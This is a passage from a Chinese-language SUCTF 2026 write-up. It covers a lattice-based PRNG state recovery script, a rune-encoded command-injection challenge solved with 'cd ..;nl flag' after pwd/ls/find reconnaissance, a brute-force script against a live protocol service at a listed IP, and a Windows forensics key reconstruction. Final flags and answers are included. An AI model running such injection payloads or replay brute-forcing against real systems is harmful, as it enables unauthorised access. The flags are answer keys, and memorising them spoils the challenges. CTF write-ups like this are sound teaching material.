                    log.success(f"State recovered (N={N}, bkz={bkz_block})")
                    return state
    return None

# ══════════════════════════════════════════════════════════════
# Step 5 : Back-compute initial state x_0..x_23
# ══════════════════════════════════════════════════════════════
def backcompute_initial(state_24_47, coeffs, m):
    c0_inv = int(pow(coeffs[0], -1, m))
    xs = [None] * ORDER + list(state_24_47)
    for k in range(ORDER - 1, -1, -1):
        val = xs[k + ORDER]
        for i in range(1, ORDER):
            val -= coeffs[i] * xs[k + i]
        xs[k] = (val * c0_inv) % m
    return xs[:ORDER]

# ══════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════
def main():
    context.log_level = 'info'

    io = remote(HOST, PORT, timeout=30)

    # Step 0: Collect hints
    hints = collect_hints(io, NUM_HINTS)
    if len(hints) < R + T:
        log.error(f"Not enough hints: {len(hints)}")
        io.close()
        return

    # Step 1: Find annihilating polynomials
    polys = find_annihilating_polys(hints)

    # Step 2: Recover modulus
    m = recover_modulus(polys)
    if m is None:
        log.error("Failed to recover modulus")
        io.close()
        return

    # Step 3: Recover connection polynomial
    coeffs = recover_connection_poly(polys, m)
    if coeffs is None:
        log.error("Failed to recover connection polynomial")
        io.close()
        return

    # Step 4: Recover exact state
    state = recover_state(hints, coeffs, m)
    if state is None:
        log.error("Failed to recover state")
        io.close()
        return

    # Step 5: Back-compute initial state
    initial = backcompute_initial(state, coeffs, m)
    answer = sum(initial) % m
    log.success(f"Answer = {answer}")

    # Step 6: Submit
    io.sendline(b"1")
    time.sleep(1)
    io.recv(timeout=3)  # consume any pending output
    io.sendline(str(answer).encode())

    time.sleep(2)
    result = b""
    try:
        result = io.recvall(timeout=10)
    except:
        pass
    print(result.decode(errors='ignore'))
    io.close()

if __name__ == "__main__":
    main()
```

运行结果

```Plain
[+] Collected 400 hints
[*] Running BKZ (block=20) on 200x300 matrix ...
[*] BKZ done in 180.7s
[+] m = 1152921504606797279  (60 bits)
[+] Connection polynomial recovered (degree 24)
[+] State recovered (N=30, bkz=20)
[+] Answer = 741299149924890974
Congratulations! Here is your flag: SUCTF{b8faea32-9f91-42b5-9355-33865e06270c}
```

Flag

```Plain
SUCTF{b8faea32-9f91-42b5-9355-33865e06270c}
```

# Misc

## SU_Signin

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170801232.png)

```
SUCTF{W3lc0me_2_SUC7F2026!!!!}
```

## SU_Artifact_Online

题目结论

这题本质上不是“从故事里猜关键词”，而是一个：

- rune 输入界面
- 带 PoW 的在线服务
- 5x5 路径约束输入
- 最终把 spell 当 shell 命令执行

的命令执行题。

最终 flag：

```Plain
SUCTF{Th1s_i5_@_Cub3_bu7_n0t_5ome7hing_u_pl4y}
```

1.题目一开始最容易走歪的地方

题目附件 `something mysterious.txt` 解出来后，是《All You Zombies》的片段，所以一开始非常容易误判成：

- 需要从故事文本里找某个固定单词
- 或者需要打某些高信号关键词

实际在线打过之后，这条路不对。

真正有用的是：

- 附件帮助恢复 rune 到 ASCII 的映射
- 在线服务的 `activate` 界面是在输入字符串
- 输入的字符串最终会被服务端当成 shell 命令执行

所以题目的核心不是文学分析，而是：

1. 解 PoW
2. 识别 rune 编码
3. 还原状态
4. 在受限路径规则下拼出命令
5. 用正确命令读到 flag

2.协议分析

2.1 PoW

连接后先给：

```Plain
sha256("prefix" + S).hexdigest()[:6] == "000000"
```

通过后才进入正式菜单。

2.2 菜单

菜单大致是：

```Plain
1 -- Try to twist it
2 -- Try to activate it
q -- Leave
```

其中：

- `Try to twist it`：对当前立方体状态做旋转
- `Try to activate it`：在前脸上按规则选 rune，形成一串 spell

2.3 Twist 模式

支持：

- `R1` 到 `R5`
- `C1` 到 `C5`
- `F1` 到 `F5`
- 再加 `'` 表示反向

所以可以把它看成一个可搜索的离散状态空间。

2.4 Activate 模式

这是整题最关键的规则。

输入不是随便点的，而是：

- 第一个字符必须从第 0 行开始
- 之后横向和纵向移动交替进行
- 每次 `Enter` 选中当前位置 rune
- 按 `x` 提交

也就是说，能不能拼出一个命令，不取决于“前脸有没有这些字符”，而取决于“能不能找到一条满足交替规则的路径”。

3.rune 映射

附件解出来后，可以恢复绝大多数映射。

最终用到的表如下：

```JSON
RUNE_TO_ASCII = {
    "ᚠ": "a",
    "ᚢ": "b",
    "ᚦ": "c",
    "ᚨ": "d",
    "ᚱ": "e",
    "ᚲ": "f",
    "ᚷ": "g",
    "ᚹ": "h",
    "ᚺ": "i",
    "ᚾ": "j",
    "ᛁ": "k",
    "ᛃ": "l",
    "ᛇ": "m",
    "ᛈ": "n",
    "ᛉ": "o",
    "ᛋ": "p",
    "ᛏ": "q",
    "ᛒ": "r",
    "ᛖ": "s",
    "ᛗ": "t",
    "ᛚ": "u",
    "ᛜ": "v",
    "ᛟ": "w",
    "ᛤ": "x",
    "ᛣ": "y",
    "ᛞ": "z",
    "ᚯ": "'",
    "ᛥ": ",",
    "ᛧ": ".",
    "ᛦ": ";",
    "ᛨ": " ",
}
```

最后输出 flag 时又出现了两个额外 rune：

- `ᚪ -> {`
- `ᚫ -> }`

4.为什么能判断它是命令执行题

真正把题目模型打正的，是成功执行了几条简单命令。

4.1 `pwd`

成功回显：

```Plain
/home/ctf
```

这一步几乎已经坐实：spell 会被当命令执行。

4.2 `ls ..`

成功回显：

```Plain
ctf
flag
```

说明当前目录是 `/home/ctf`，其上一级 `/home` 下有：

- `ctf`
- `flag`

4.3 `find ..`

成功回显：

```Plain
..
../flag
../ctf
../ctf/.bash_logout
../ctf/.bashrc
../ctf/.profile
../ctf/server.py
```

这一步继续确认：

- `flag` 是 `/home` 下的真实路径
- `ctf/server.py` 存在

同时也说明：继续猜故事词没有意义，应该直接围绕 shell 命令做自动化。

5.关键限制

5.1 会话窗口很短

虽然题面上显示了较长倒计时，但单个在线实例真正可用的活跃时间非常短，实际打下来大约就是几十秒量级。

所以必须：

- 自动解 PoW
- 自动找路径
- 自动提交

不能靠人工慢慢试。

5.2 不是所有字符都能输入

这点非常关键。

最后验证下来，至少这些字符不能作为正常命令字符稳定输入：

- `-`
- `/`

因此很多自然命令其实不可用，比如：

- `ls -l ..`
- `cat ../flag`
- `file ../flag`

所以命令设计必须绕开这些字符。

5.3 激活时序容易漂

搜索已经 exact，不代表最终就能正确提交。

实际打的时候经常出现：

- exact 已经命中目标命令
- activate 的按键发送太快或界面刷新干扰
- spell 被敲歪

这是后期最大的工程问题。

6.有效命令筛选

围绕 `/home/flag` 尝试过的思路主要有：

- `cd ..;cat flag`
- `cd ..;ls flag`
- `cd ..;find flag`
- `cd ..;stat flag`
- `cd ..;file flag`
- `cd ..;nl flag`

其中：

- `file/stat/find` 偏长，收敛更吃会话时长
- `cat flag` 逻辑最直接，但 exact 不够稳定
- `nl flag` 是最适合的折中点

原因：

- 不需要 `-`
- 不需要 `/`
- 功能等价于读文本
- 在多轮搜索里更容易 exact

最终命中的命令就是：

cd ..;nl flag

7.最终成功输出

成功那轮服务端返回了带行号输出：

```Plain
1    SUCTFᚪTᚹ1ᛖ_ᚺ5_@_Cᛚᚢ3_ᚢᛚ7_ᛈ0ᛗ_5ᛉᛇᚱ7ᚹᚺᛈᚷ_ᛚ_ᛋᛃ4ᛣᚫ
```

其中前面的 `1` 是 `nl` 带出来的行号。

把 rune 解码后得到：

```Plain
SUCTF{Th1s_i5_@_Cub3_bu7_n0t_5ome7hing_u_pl4y}
```

8.为什么最后是 `nl flag` 而不是 `cat flag`

不是因为 `cat` 逻辑不对，而是在线条件下：

- `cat flag` 经常卡在 near miss
- `nl flag` 更容易到 exact
- 成功窗口更大

也就是说，这不是语义层面的区别，而是状态搜索和在线时延下的“可达性”差异。

9.解题链总结

完整思路可以概括成：

1. 用附件恢复 rune 表
2. 解 PoW
3. 识别 `activate` 的交替路径规则
4. 自动重建状态并搜索目标字符串
5. 用 `pwd`、`ls ..`、`find ..` 证明它是命令执行环境
6. 确认目标路径在 `/home/flag`
7. 选择在当前字符限制下最稳的读取命令 `cd ..;nl flag`
8. 读取带 rune 的 flag 输出
9. 补 `{}` 映射并完成解码

最终 flag

```Plain
SUCTF{Th1s_i5_@_Cub3_bu7_n0t_5ome7hing_u_pl4y}
```

Exp:

```Python
from __future__ import annotations

import argparse
import re

RUNE_TO_ASCII = {
    "ᚠ": "a",
    "ᚢ": "b",
    "ᚦ": "c",
    "ᚨ": "d",
    "ᚱ": "e",
    "ᚲ": "f",
    "ᚷ": "g",
    "ᚹ": "h",
    "ᚺ": "i",
    "ᚾ": "j",
    "ᛁ": "k",
    "ᛃ": "l",
    "ᛇ": "m",
    "ᛈ": "n",
    "ᛉ": "o",
    "ᛋ": "p",
    "ᛏ": "q",
    "ᛒ": "r",
    "ᛖ": "s",
    "ᛗ": "t",
    "ᛚ": "u",
    "ᛜ": "v",
    "ᛟ": "w",
    "ᛤ": "x",
    "ᛣ": "y",
    "ᛞ": "z",
    "ᚯ": "'",
    "ᛥ": ",",
    "ᛧ": ".",
    "ᛦ": ";",
    "ᛨ": " ",
    "ᚪ": "{",
    "ᚫ": "}",
}

ASCII_TO_RUNE = {v: k for k, v in RUNE_TO_ASCII.items()}

FINAL_COMMAND = "cd ..;nl flag"

FINAL_RUNE_FLAG = "SUCTFᚪTᚹ1ᛖ_ᚺ5_@_Cᛚᚢ3_ᚢᛚ7_ᛈ0ᛗ_5ᛉᛇᚱ7ᚹᚺᛈᚷ_ᛚ_ᛋᛃ4ᛣᚫ"


def decode_runes(text: str) -> str:
    return "".join(RUNE_TO_ASCII.get(ch, ch) for ch in text)


def encode_ascii(text: str) -> str:
    return "".join(ASCII_TO_RUNE.get(ch, ch) for ch in text)


def extract_flag_line(text: str) -> str:
    """
    Accept a raw line such as:

        1    SUCTFᚪTᚹ1ᛖ_...

    and return just the rune payload beginning with SUCTF.
    """
    match = re.search(r"SUCTF\S*", text)
    if not match:
        raise ValueError("could not find SUCTF-prefixed rune payload")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description="Decode the recovered rune output for SU_Artifact_Online")
    parser.add_argument(
        "text",
        nargs="?",
        default=FINAL_RUNE_FLAG,
        help="Rune payload or a whole output line. Defaults to the recovered final rune flag.",
    )
    parser.add_argument(
        "--extract",
        action="store_true",
        help="Treat the input as a full output line and extract the SUCTF-prefixed token first.",
    )
    parser.add_argument(
        "--show-command",
        action="store_true",
        help="Print the final effective remote command before decoding.",
    )
    args = parser.parse_args()

    text = args.text
    if args.extract:
        text = extract_flag_line(text)

    if args.show_command:
        print(f"[command] {FINAL_COMMAND}")

    print(decode_runes(text))


if __name__ == "__main__":
    main()
```

## SU_MirrorBus9

题目信息

- 题目：`SU_MirrorBus9`
- 分类：`Misc`
- 远端：`1.95.73.223:10011`
- 目标：分析一个半双工工业总线的黑盒协议，完成 `ARM` 和 `PROVE`，拿到真实 flag

最终 flag：

```Plain
SUCTF{mb9_file_only_flag_runtime_hardened}
```

一、初始探测

连上去的 banner 大概是：

```Plain
MB9 name=MirrorBus-9 ver=1 mode=half_duplex seed_mode=per_connection sid=<hex>
MB9_HINT cmd=HELP noecho=1 gift=SUCTF{...} replay_scope=session
```

执行 `HELP`：

```Plain
INFO protocol=MirrorBus-9 noecho=queue_commit_poll
INFO commands=HELP,STATUS,ENQ,ARM,COMMIT,POLL,RESET,PROVE,LIST,VER,PING,QUIT
INFO enq_opcodes=INJ,ROT,MIX,BIAS,NOP,ARM
```

可以看出这个服务的基本工作流是：

1. 用 `ENQ` 往队列里塞操作
2. 用 `COMMIT` 执行队列
3. 用 `POLL` 读取产生的帧

最重要的几条命令：

- `RESET`：重置当前 session 状态
- `ENQ MIX a b c`：设置一个三元参数
- `ENQ ARM`：触发 ARM 检查
- `PROVE x y z`：提交证明

二、协议行为观察

常见测试序列：

```Plain
RESET
ENQ MIX 0 0 0
ENQ ARM
COMMIT
POLL 16
```

失败时，最后一帧类似：

```Plain
F cid=1 tick=1 lane=0 sig=<...> aux=<...> tag=ARM_FAIL
```

成功时，最后一帧会变成：

```Plain
F cid=<n> tick=<n> lane=0 sig=<S> aux=<A> tag=CHAL nonce=<12 hex> ttl=192
```

后续实验得到这些稳定结论：

1. `ARM` 成功后会进入 challenge 状态，返回一帧 `CHAL`
2. 同一个 session 里，`CHAL` 的 `sig/aux` 固定，`nonce` 会变化
3. `RESET` 会把状态恢复到该 session 的初始 challenge
4. 错误 `PROVE` 最多允许 7 次，之后 challenge 清空
5. `PROVE` 校验的是 `CHAL` 帧，而不是你喂给 `ARM` 的输入

题目给的 hint 也直接说明了这一点：

```Plain
PROVE verifies the CHAL frame, not the ARM state you fed into it;
the first two parameters are taken from CHAL,
and the third is a 16-bit checksum that includes the nonce.
```

三、`ARM` 部分的逆向

1. 核心现象

对 `MIX a b c` 的三维参数做基向量探测：

- `(0,0,0)`
- `(1,0,0)`
- `(0,1,0)`
- `(0,0,1)`

每次都做：

```Plain
RESET
ENQ MIX a b c
ENQ ARM
COMMIT
POLL 16
```

记录最后一个 `ARM_FAIL` 帧的 `(sig, aux)`。

实验发现：

- 隐藏系统在模 `65521` 下表现为线性系统
- 可以通过四次基向量观测解出一个让 `ARM` 成功的 `MIX`
- 建模

记四次失败结果为：

- `I = FAIL(0,0,0)`
- `A = FAIL(1,0,0)`
- `B = FAIL(0,1,0)`
- `C = FAIL(0,0,1)`

实际利用里直接取目标向量 `u=(0,b,c)`，不管第一维。

定义：

```Plain
sb = (B.sig - I.sig) mod 65521
sc = (C.sig - I.sig) mod 65521
ub = (B.aux - I.aux) mod 65521
uc = (C.aux - I.aux) mod 65521
```

要求成功时，最后的 `(sig,aux)` 归零，于是有：

```Plain
I.sig + b*sb + c*sc = 0 mod 65521
I.aux + b*ub + c*uc = 0 mod 65521
```

这就是一个二元一次方程组。

3. 直接求解

设：

```Plain
rhs1 = -I.sig mod 65521
rhs2 = -I.aux mod 65521
d    = sb*uc - sc*ub mod 65521
```

则：

```Plain
b = (rhs1*uc - sc*rhs2) * inv(d) mod 65521
c = (sb*rhs2 - rhs1*ub) * inv(d) mod 65521
```

解出后，发送：

```Plain
RESET
ENQ MIX 0 b c
ENQ ARM
COMMIT
POLL 16
```

即可稳定拿到 `CHAL`。

4. 额外观察

还测过带 `ROT phase` 的情况。结论是：

- 不同 phase 也能独立解出成功的 `MIX`
- 但同一 session 下得到的 `CHAL` 本质上由 session/challenge 序号决定
- 成功 `ARM` 用到的具体内部状态，不影响 `PROVE` 需要验证的 challenge 内容

这也印证了 hint：`PROVE` 验证的是 `CHAL` 帧本身。

四、`PROVE` 的逆向过程

1. 前两个参数

hint 说 “the first two parameters are taken from CHAL”。

起初可能会猜：

- `cid tick`
- `sig aux`
- 其他字段组合

经过实际验证，最终确认：

```Plain
PROVE p1 p2 p3
```

里的前两个参数就是：

```Plain
p1 = CHAL.sig
p2 = CHAL.aux
```

也就是说，`PROVE` 的提交格式是：

```Plain
PROVE <sig> <aux> <checksum16>
```

2. 第三个参数

第三个参数是一个 16 位校验值，并且 “includes the nonce”。

这里做过大量搜索，包括但不限于：

- 常见 CRC16 家族
- 各种大小端编码
- 二进制帧布局与文本帧布局
- Adler / Fletcher / ones-complement / sum / xor
- md5/sha1/blake2 截断
- 是否包含 `cid/tick/lane/ttl/sid`
- 是否直接和 nonce 或 PRNG 输出相关

没有恢复出一个跨 session 稳定通用的闭式 checksum 公式。

但是，这题并不需要把公式完全推出来才能拿旗。

五、真正的利用点：`RESET` 可以重放同一个 challenge

这是整题最关键的地方。

在一个 session 里：

1. 先用上面逆出来的 `MIX` 让 `ARM` 成功
2. 服务端给出一个初始 `CHAL`
3. 如果 `PROVE` 输错 7 次，challenge 会消失
4. 但只要 `RESET`，再重新做一遍成功 `ARM`，就会恢复到**同一个初始** **`CHAL`**

也就是说，在同一条连接内可以反复获得完全相同的：

- `sig`
- `aux`
- `nonce`
- 整条 `CHAL` 帧

于是正确的第三个参数在该 session 内也是固定的。

六、为什么能直接爆破

1. `p3` 只有 16 位

第三个参数是 `0..65535`。

即总空间只有：

```Plain
65536
```

2. 每次 challenge 可以试 7 个

因为 7 次错误后 challenge 清空，所以一次重放最多试 7 个值。

3. 一个 session 有足够高的命令预算

实际压测下来，一个 session 可以支撑大约 160 轮左右这样的操作：

```Plain
RESET
ENQ MIX ...
ENQ ARM
COMMIT
POLL 16
PROVE ...
PROVE ...
...
PROVE ...   # 共 7 次
```

于是一个 session 大约能尝试：

```Plain
160 * 7 = 1120
```

个候选值。

4. 效率足够

一次 session 试 1120 个值，命中概率约为：

```Plain
1120 / 65536 ≈ 1.7%
```

平均几十个 session 内就能撞到正确值。配合批量发送命令，速度很快。

实际跑的时候，往往比这个期望更快。我这边有一次第 7 个 session 就出了。

七、利用脚本的实现思路

最终脚本的逻辑很简单：

1. 建立连接

读取 banner，拿到当前 session 的 `sid`。

2. 四次基向量探测

分别跑：

```Plain
MIX 0 0 0
MIX 1 0 0
MIX 0 1 0
MIX 0 0 1
```

提取四个 `ARM_FAIL` 帧的 `(sig,aux)`。

3. 解线性方程

计算出 `(0,b,c)`。

4. 构造初始 challenge

执行：

```Plain
RESET
ENQ MIX 0 b c
ENQ ARM
COMMIT
POLL 16
```

拿到该 session 的初始 `CHAL`。

5. 提取 `sig/aux`

后续所有 `PROVE` 都固定用：

```Plain
PROVE <sig> <aux> <guess>
```

6. 利用 `RESET` 做 challenge 重放

每次构造一组命令：

```Plain
RESET
ENQ MIX 0 b c
ENQ ARM
COMMIT
POLL 16
PROVE sig aux g0
PROVE sig aux g1
...
PROVE sig aux g6
```

这样一轮试 7 个值。

7. 直到命中

如果某次返回不是 `bad_proof`，就说明命中了：

```Plain
OK cmd=PROVE status=PASS flag=SUCTF{mb9_file_only_flag_runtime_hardened}
```

八、实际命中的一组结果

命中时的 challenge 例如：

```Plain
F cid=1 tick=1 lane=0 sig=53699 aux=23845 tag=CHAL nonce=172d1b83c1da ttl=192
```

命中的第三个参数例如：

```Plain
8447
```

然后返回：

```Plain
OK cmd=PROVE status=PASS flag=SUCTF{mb9_file_only_flag_runtime_hardened}
```

注意这个第三个参数不是全局常数，它是**当前 session 的这个 challenge**对应的正确 16 位值。

九、这题到底逆了多少

这题最终完成到下面这个程度：

1. `ARM` 的内部约束被完整线性化并稳定求解
2. `PROVE` 的前两个参数确定是 `CHAL.sig` 和 `CHAL.aux`
3. 确认第三个参数是包含 nonce 的 16 位校验
4. 利用 `RESET` 可重放 challenge 的性质，对第三个参数做高效 session 内爆破
5. 稳定拿到 flag

严格说：

- `ARM` 部分已经属于完整逆向
- `PROVE` 的 checksum 公式没有被彻底还原成一个可闭式表达的算法
- 但利用链是完整且稳定的，能实战打出 flag

对于这类黑盒 Misc/协议题，这已经足够构成完整解法。

十、总结

这题最关键的三个突破点：

1. `ARM_FAIL(sig,aux)` 对 `MIX` 三元组在模 `65521` 下呈线性
2. `PROVE` 的前两个参数就是 `CHAL.sig/aux`
3. `RESET` 能恢复同一个初始 challenge，从而允许对 16 位 `p3` 做高效重试

把这三个点串起来，题目就被打穿了。

最终 flag：

```Plain
SUCTF{mb9_file_only_flag_runtime_hardened}
```

Exp:

```Python
import re
import socket
import time


HOST = "1.95.73.223"
PORT = 10011

MOD = 65521
BATCH_SIZE = 7
SESSION_BATCHES = 160

FRAME_RE = re.compile(
    r"cid=(\d+)\s+tick=(\d+)\s+lane=(\d+)\s+sig=(\d+)\s+aux=(\d+)\s+tag=([^\s]+)(?:\s+nonce=([0-9a-f]+)\s+ttl=(\d+))?"
)


def inv(x):
    return pow(x, MOD - 2, MOD)


class FastMB9:
    def __init__(self, host=HOST, port=PORT):
        self.sock = socket.create_connection((host, port), timeout=5)
        self.sock.settimeout(10)
        self.buf = b""
        self.banner = [self.recv_line(), self.recv_line()]

    def close(self):
        try:
            self.send_lines(["QUIT"])
        except OSError:
            pass
        self.sock.close()

    def send_lines(self, lines):
        payload = "".join(line + "\n" for line in lines).encode()
        self.sock.sendall(payload)

    def recv_line(self):
        while b"\n" not in self.buf:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError("socket closed")
            self.buf += chunk
        line, self.buf = self.buf.split(b"\n", 1)
        return line.decode("latin1", "replace")

    def recv_poll(self):
        lines = []
        while True:
            line = self.recv_line()
            if line == "END":
                return lines
            if line:
                lines.append(line)

    def run_mix_arm(self, mix):
        self.send_lines(
            [
                "RESET",
                f"ENQ MIX {mix[0]} {mix[1]} {mix[2]}",
                "ENQ ARM",
                "COMMIT",
                "POLL 16",
            ]
        )
        for _ in range(4):
            self.recv_line()
        return self.recv_poll()


def parse_last_frame(poll_lines):
    line = None
    for cand in poll_lines:
        if cand.startswith("F "):
            line = cand
    if not line:
        raise ValueError(f"no frame in poll output: {poll_lines!r}")
    m = FRAME_RE.search(line)
    if not m:
        raise ValueError(f"bad frame: {line}")
    return {
        "cid": int(m.group(1)),
        "tick": int(m.group(2)),
        "lane": int(m.group(3)),
        "sig": int(m.group(4)),
        "aux": int(m.group(5)),
        "tag": m.group(6),
        "nonce": bytes.fromhex(m.group(7)) if m.group(7) else b"",
        "ttl": int(m.group(8)) if m.group(8) else None,
        "raw": line,
    }


def solve_mix(session):
    vals = {}
    for mix in ((0, 0, 0), (1, 0, 0), (0, 1, 0), (0, 0, 1)):
        vals[mix] = parse_last_frame(session.run_mix_arm(mix))

    i0 = vals[(0, 0, 0)]
    b0 = vals[(0, 1, 0)]
    c0 = vals[(0, 0, 1)]

    sb = (b0["sig"] - i0["sig"]) % MOD
    sc = (c0["sig"] - i0["sig"]) % MOD
    ub = (b0["aux"] - i0["aux"]) % MOD
    uc = (c0["aux"] - i0["aux"]) % MOD
    rhs1 = (-i0["sig"]) % MOD
    rhs2 = (-i0["aux"]) % MOD
    d = (sb * uc - sc * ub) % MOD

    b = ((rhs1 * uc - sc * rhs2) % MOD) * inv(d) % MOD
    c = ((sb * rhs2 - rhs1 * ub) % MOD) * inv(d) % MOD
    return (0, b, c)


def brute_session(session, mix, start_guess):
    chal = parse_last_frame(session.run_mix_arm(mix))
    if chal["tag"] != "CHAL":
        raise RuntimeError(f"expected CHAL, got {chal}")

    sig = chal["sig"]
    aux = chal["aux"]
    target_raw = chal["raw"]
    tested = 0

    while tested < SESSION_BATCHES * BATCH_SIZE:
        lines = []
        guess_groups = []

        for _ in range(SESSION_BATCHES):
            guesses = [((start_guess + tested + i) & 0xFFFF) for i in range(BATCH_SIZE)]
            tested += BATCH_SIZE
            guess_groups.append(guesses)
            lines.extend(
                [
                    "RESET",
                    f"ENQ MIX {mix[0]} {mix[1]} {mix[2]}",
                    "ENQ ARM",
                    "COMMIT",
                    "POLL 16",
                ]
            )
            lines.extend([f"PROVE {sig} {aux} {guess}" for guess in guesses])

        session.send_lines(lines)

        for guesses in guess_groups:
            for _ in range(4):
                session.recv_line()
            cur = parse_last_frame(session.recv_poll())
            if cur["raw"] != target_raw:
                raise RuntimeError("challenge changed after RESET")
            for guess in guesses:
                reply = session.recv_line()
                if "bad_proof" not in reply:
                    return chal, guess, reply

    return chal, None, None


def extract_flag(reply):
    m = re.search(r"flag=(SUCTF\{[^}]+\})", reply)
    return m.group(1) if m else None


def main():
    t0 = time.time()
    session_id = 0

    while True:
        session_id += 1
        start_guess = (session_id * SESSION_BATCHES * BATCH_SIZE) & 0xFFFF
        session = FastMB9()
        try:
            mix = solve_mix(session)
            chal, guess, reply = brute_session(session, mix, start_guess)
            if reply is None:
                sid = session.banner[0].split("sid=")[-1]
                print(
                    f"[session {session_id}] sid={sid} sig={chal['sig']} aux={chal['aux']} no-hit",
                    flush=True,
                )
                continue

            flag = extract_flag(reply)
            print(f"[session {session_id}] challenge={chal['raw']}", flush=True)
            print(f"[session {session_id}] guess={guess} reply={reply}", flush=True)
            if flag:
                print(flag, flush=True)
                print(f"elapsed={time.time() - t0:.2f}s", flush=True)
                return
            raise RuntimeError(f"unexpected reply: {reply}")
        finally:
            session.close()


if __name__ == "__main__":
    main()
```

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170802004.png)

## SU_forensics

题目信息

- 题目：`SU_forensics`
- 分类：`Misc / Forensics`
- 核心目标：针对给出的 Windows 系统盘镜像，恢复嫌疑人的密钥生成、记事本编辑、Ollama/CherryStudio/uTools 使用痕迹，并回答 7 个问题，最后按指定格式拼接 `flag`。

最终答案

1. `2026/03/05T17:23:06`
2. `c1c4c50f51afc97a58385457af43e169`
3. `zQt$d3!GIS9l.aR@7ELN`
4. `019cbe60-6803-70fe-8ab5-e0035399980f_2026/03/05T22:25:24`
5. `zQt$d3!GIS9l.aR@7ELNA9!fK2@pL4#tM6$wN8%yR1^uD3&hJ5*Z17727207244dE23eFgH7kLmNpOqRstUvWxYz012345678901234567890123456789`
6. `2026/03/05T21:58:17`
7. `40854344-3f6e-4464-a07f-b39d42f5adc5`

最终 flag：

```
SUCTF{39e850db5d740c54df4281e39fb3866d}
```

取证总体思路

这题本质上是多源取证：

- 系统关机时间：Windows 事件日志
- 记事本删除内容：Windows 11 新版 Notepad 状态文件
- 第二密钥与报错时间：Ollama 本地数据库和日志
- 固定格式 prompt：CherryStudio IndexedDB
- 第一密钥与完整密钥：uTools 剪贴板与收藏数据库

**Q1 设备上次关闭时间:**

证据来源

- System.evtx

分析方法

查找系统关机相关事件。最终命中的关键事件是：

- `Kernel-General`
- `Event ID 13`
- UTC 时间：`2026-03-05T09:23:06.646345800Z`

换算到 `UTC+8`：

- `2026/03/05T17:23:06`

Q1 答案

```
2026/03/05T17:23:06
```

**Q2 记事本删除内容的 MD5:**

证据来源

- Notepad 状态目录
- 目标文件： 992ff4a3-c3e9-401e-9320-82ddc5fa9d31.bin
- 解析输出： UnsavedBufferChunks.csv

分析方法

新版 Windows Notepad 的未保存内容并不直接明文保存在普通临时文本里，而是记录在 tab state / unsaved buffer chunks 中。

使用 `Notepad-State-Library` 对目标 tab 进行解析后，可以复原文本编辑过程。

恢复出的关键文本峰值如下：

Key instructions:

1.Key must not be entirely stored on disk

2.The key has four parts

3.The key requires reshuffling order:1-4-3-2

4.There is a Key generted by AI

5..........

其中第 5 行只是占位点，说明完整密钥规则没有直接写全，但这份被删文本本身可以求 MD5。

最终经解析与验证站确认，删除内容的 MD5 为：

Q2 答案

```
c1c4c50f51afc97a58385457af43e169
```

**Q4 第二密钥的对话 id 和时间:**

证据来源

- Ollama db.sqlite

分析方法

枚举 `chats` 与 `messages` 表，发现一个非常关键的聊天：

- chat id：`019cbe60-6803-70fe-8ab5-e0035399980f`
- title：`第二密钥生成尝试`

对应消息链：

- 用户：`openssl rand -base64 32 | tr '+/' '-_' | tr -d '=' 给一个例子`
- 助手返回示例：

4dE23eFgH7kLmNpOqRstUvWxYz012345678901234567890123456789

这就是题目所指的第二密钥来源会话。

这里的坑点是：题目要的“时间”不是消息 `created_at`，也不是 chat 创建时间，而是 assistant 消息的 `updated_at`。

最终验证站认可的答案为：

Q4 答案

```
019cbe60-6803-70fe-8ab5-e0035399980f_2026/03/05T22:25:24
```

**Q6 Ollama 客户端** **`no such host`** **的时间：**

证据来源

- app.log

分析方法

直接检索 `no such host`。

命中日志行为：

- `2026-03-05T21:58:17.244+08:00`

按题目要求输出到秒：

Q6 答案

```
2026/03/05T21:58:17
```

**Q7 固定格式 prompt 的 message id：**

证据来源

- CherryStudio IndexedDB

分析方法

CherryStudio 的聊天数据在 IndexedDB / LevelDB 中，重点对象仓：

- `topics`
- `message_blocks`

还原 topic 后，关键会话是：

- topic id：`bef7324a-9e11-4e23-a19f-624f662a92c8`

其中一条 assistant 消息给出为了固定格式输出密钥的 prompt / 命令思路，对应 message id 为：

Q7 答案

```
40854344-3f6e-4464-a07f-b39d42f5adc5
```

**Q3 第一密钥：**

关键 hint

题目真正的突破点在 `uTools`，不是 Ollama / CherryStudio。

证据来源

- uTools 解密后剪贴板 1772700955558

关键证据

在该文件中直接出现第一密钥明文：

- 命中位置

内容为：

```
zQt$d3!GIS9l.aR@7ELN
```

Q3 答案

```
zQt$d3!GIS9l.aR@7ELN
```

**Q5 最终完整密钥：**

这是整题最核心的一问。

第一步：确认密钥拼接规则

在 `uTools` 解密后的剪贴板记录里可以看到规则文本：

- 规则文本

内容：

Key Instructions:

1.Key must not be entirely stored on disk.

2.The key has four parts

3.Key usage requires reshuffling order: 1-4-3-2

4.Content needs to be randomized using AI.

也就是说：

- 完整密钥共有 4 段
- 使用顺序为 `1-4-3-2`

第二步：恢复第 4 段

同一份 `uTools` 解密剪贴板里反复出现：

- key4

内容：

A9!fK2@pL4#tM6$wN8%yR1^uD3&hJ5*Z

第三步：恢复第 2 段

第 2 段来自 Ollama 第二密钥示例，即 Q4 对应会话内的那条 assistant 消息：

4dE23eFgH7kLmNpOqRstUvWxYz012345678901234567890123456789

第四步：恢复第 3 段

在另一份 `uTools` 解密剪贴板中出现明确提示：

第三密钥为第二密钥生成时间的时间戳

第二密钥生成时间已经在 Q4 求得：

- `2026/03/05T22:25:24` (`UTC+8`)

将这个时间转为 Unix 时间戳：

1772720724

这就是第 3 段。

第五步：恢复第 1 段

第 1 段来自 Q3：

zQt$d3!GIS9l.aR@7ELN

第六步：按 `1-4-3-2` 重排

拼接顺序：

1. `key1 = zQt$d3!GIS9l.aR@7ELN`
2. `key4 = A9!fK2@pL4#tM6$wN8%yR1^uD3&hJ5*Z`
3. `key3 = 1772720724`
4. `key2 = 4dE23eFgH7kLmNpOqRstUvWxYz012345678901234567890123456789`

得到：

```HTTP
zQt$d3!GIS9l.aR@7ELNA9!fK2@pL4#tM6$wN8%yR1^uD3&hJ5*Z17727207244dE23eFgH7kLmNpOqRstUvWxYz012345678901234567890123456789
```

Q5 答案

```
